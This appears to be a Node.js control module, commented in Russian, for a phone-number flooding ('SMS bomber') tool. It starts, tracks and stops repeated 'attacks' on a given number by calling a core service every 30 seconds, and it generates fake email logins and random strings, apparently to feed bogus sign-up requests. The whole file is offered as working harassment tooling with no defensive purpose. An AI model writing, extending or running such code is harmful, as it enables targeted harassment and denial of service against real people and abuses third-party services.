const service = require("./core.js")
var current_attacks = [];
var list_attacks = [];

/* 
Иницилизация атаки
    - number - номер телефона без знака "+" (Например: 79865329543)
    - loop - количество повторов цикла атаки
*/
module.exports.attack = function(number, loop){
    if(!Number(number) || number.toString().length < 11){
            result = {
                "success": false,
                "text": `Указанный параментр number не является номером телефона либо вовсе не указан`
            }
        return result; 
    }
    if(!Number(loop) || !loop){
        result = {
            "success": false,
            "text": `Указанный параментр loop не является корректным либо вовсе отсутстует`
        }
        return result; 
    }else{
        result = {
            "success": true,
            "text": `Атака на номер ${number} успешно запущена`
        }
    count = 0;

    list_attacks.push({number: number, loop: loop, startedAt: Date.now()})

    current_attacks[number] = setInterval(async function(){
        service.start(number)
                count++;
                    if(count == loop){
                        clearInterval(current_attacks[number]);
                        for(let key in list_attacks){
                            if(list_attacks[key].number == number){
                                list_attacks.splice(key, 1);
                            }
                        }
                    }
        }, 30000);
    }
    return result;
}

/*
Остановка атаки
    - number - номер телефона без знака "+" (Например: 79865329543)
*/
module.exports.stop = function(number){
    if(current_attacks[number]){
        clearInterval(current_attacks[number])
    result = {
        success: true,
        text: `Атака на номер ${number} успешно прекращена`
    }
    return result
    }else{
        result = {
            success: false,
            text: `Нет активных атак по номеру ${number}`
        }
    return result
    }
}

/* 
Возвращает список активных атак
*/
module.exports.list = function(){
    if(list_attacks.length === 0){
        result = {
            success: false,
            text: `Список активных атак пуст`
        }
    return result
    }else{
        result = {
            success: true,
            result: list_attacks
        }
    return result
    }
}

module.exports.mailGen = function(){
    let domains = ['@mail.ru', '@yandex.ru', '@gmail.com', '@rambler.ru']
    let fakelogin = Math.random().toString(36).substr(5, 9)
    let result = fakelogin + getRandomElement(domains)
    return result
}

module.exports.charsGen = function(){
    let result = Math.random().toString(36).substr(5, 9)
    return result
}

function rand(min, max){
	return Math.round(Math.random() * (max - min)) + min
}   

function getRandomElement(arr) {
    var rand = Math.floor(Math.random() * arr.length);
    return arr[rand];
}
